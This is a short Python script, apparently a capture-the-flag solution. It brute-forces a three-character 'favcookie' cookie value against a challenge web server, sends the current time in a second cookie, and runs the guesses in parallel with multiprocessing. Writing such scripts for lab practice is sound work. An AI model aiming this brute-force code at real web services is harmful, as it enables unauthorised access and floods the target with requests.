import requests
import itertools
import datetime  
import urllib
import string
from tqdm import tqdm
import multiprocessing as mp
import random

random.seed(42)

url = 'http://chall.eng.run:31784/'
BAD = 'ARE YOU LOOKING FOR SOMETHING?'
domain = list(string.ascii_lowercase + string.digits)
random.shuffle(domain)

def do_stuff(a, b, c):
	cookie = a + b + c
	# print(cookie)
	time = datetime.datetime.now(datetime.timezone.utc)
	time = urllib.parse.quote(time.strftime("%H:%M"))
	cookies = dict(favcookie=cookie, time=time)
	r = requests.get(url, cookies=cookies)
	if BAD not in r.text:
		print(r.text)

pool = mp.Pool(mp.cpu_count())
results = pool.starmap(do_stuff, itertools.product(domain, repeat=3))
pool.close()    

# for cookie in tqdm(itertools.product(domain, repeat=3), total=len(domain)**3):
	# do_stuff(*cookie)

